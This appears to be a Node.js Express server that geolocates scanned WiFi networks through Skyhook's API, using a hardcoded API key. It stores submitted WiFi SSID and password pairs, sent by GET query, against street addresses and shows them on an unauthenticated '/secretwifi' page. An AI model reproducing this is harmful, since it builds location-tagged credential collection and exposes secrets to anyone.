const querystring = require('querystring');
const fs = require('fs');
const https = require('https');
const http = require('http');
const express = require('express');
const app = express();
const parseString = require('xml2js').parseString;

app.set('view engine', 'hbs');
app.set('view options', { layout: '../public/views/layout.hbs' });
app.use(express.urlencoded({extended:false}));
app.use(express.static('public'));

const wifiList = {};
let wifi_dat;
let xml_dat;
let xmlPOSTdata;
let currLong, currLat;
let success = 0;
const past_latlong = [] // holds objects of form {lat, long, wifis:[ n x {ssid,pass}]}



function PostCode(post_data) {

  const post_options = {
      host: 'global.skyhookwireless.com',
      //hostname: 'https://global.skyhookwireless.com/wps2/location',
      port: '443',
      path: '/wps2/location',
      method: 'POST',
      headers: {
          'Content-Type': 'text/xml',
           'Accept': '*/*',
          'Content-Length': Buffer.byteLength(post_data)
      }
  };

  // Set up the request
  const post_req = https.request(post_options, (res) => {
      
      res.on('data', (dat) => { 
          xml_dat = dat;
          parse_api(dat);
      });
      
  });

  // post the data
  
  post_req.write(post_data);
  post_req.end();


}


app.get('/', (req, res) => {
    res.render('../public/views/home',{currLong, currLat});
 });

 app.get('/secretwifi', (req, res) => {
     // name for the page 
 
    res.render("../public/views/secretwifi",{locations:past_latlong});
   
 });

app.get('/cool', (req, res) => {
     // name for the page 
 
    res.render("../public/views/cool-file",{format:wifi_dat});
   
 });


app.get('/xmlfun', (req, res) => {
     // name for the page 
 
    res.render("../public/views/cool-file",{format:xml_dat});
   
 });

app.get('/xmlreq', (req, res) => {
     // name for the page 
 
    res.render("../public/views/cool-file",{format:xmlPOSTdata});
   
 });

app.get('/success', (req, res) => {
     // name for the page 
    
    res.render("../public/views/cool-file",{format:success});
    
 });



 app.get('/addWIFI', (req, res) => {
    
   if(req.query.ssid != "iPhone (2)"){
    req.query.ssid
    req.query.pass
    past_latlong[past_latlong.length - 1].wifis.push({ssid:req.query.ssid, 
                                 pass:req.query.pass});
   }
   
   
    res.status(200);
   let resText = "Got it!!!! :)" ;
    res.send(resText);
 });




app.post('/getGEO', (req, res) => {
  // formy = decodeURI(req.body.dat);
    success = 0;
    let bod = req.body.dat;
    
    bod = bod.split(',,');
    const acc = []
    bod.forEach((wap) => {
      const sp = wap.split('||');
      acc.push(sp);
      
    });
  wifi_dat = acc;
  xmlPOSTdata = makeXML(acc);
  PostCode(xmlPOSTdata);
  
 
 });


app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);




function makeXML(wifiList){
  const apikey = "eJwVwUEOABAMBMCzxzRR29I9inqV-LuY0aL1izFQzo4OI1UsCVkOE9ukeK_hyGxTcR8OIwrv";
  const uniID = "2AL3B-ESP-F";
  
  
  let ret = `<LocationRQ xmlns="http://skyhookwireless.com/wps/2005" version="2.25" street-address-lookup="full"> 
<authentication version="2.2">
        <key key="${apikey}"
        username="${uniID}"/>
</authentication>`;
  
  wifiList.forEach((wif) => {
    try{
    let mac = wif[1].split(':').join("");
  ret += `<access-point>
		<mac>${mac}</mac>
		<ssid>${wif[0]}</ssid> 
		<signal-strength>${wif[2]}</signal-strength>
	</access-point>`;
    } catch(err){
      console.log("parsing error");
      
    }
  });
  ret += "</LocationRQ>";
  return ret;
  
}

function parse_api(dat){
 
  
  console.log(dat.length);
  if(dat.length < 50){
  success = 0;
  return;
  }
  console.log(dat);
parseString(dat, function (err, result) {
    if(err){
      console.log("got error!!");
      PostCode(xmlPOSTdata); 
   }else{
      //console.log(result.LocationRS.location);
     let loc = result.LocationRS.location[0];
     const AdJ = loc["street-address"][0];
     let addy = `${AdJ["street-number"]} ${AdJ["address-line"]}, ${AdJ["metro1"]}, ${AdJ.state[0]['_']}. ${AdJ.country[0]['_']} ${AdJ["postal-code"]}`
     console.log(addy);
     currLat = loc.latitude;
     currLong = loc.longitude;
     const loc_info = {lat: currLat,
                      long: currLong,
                      address: addy,
                      wifis: []};
     past_latlong.push(loc_info);
     success = 1;
     
    
    }
});

}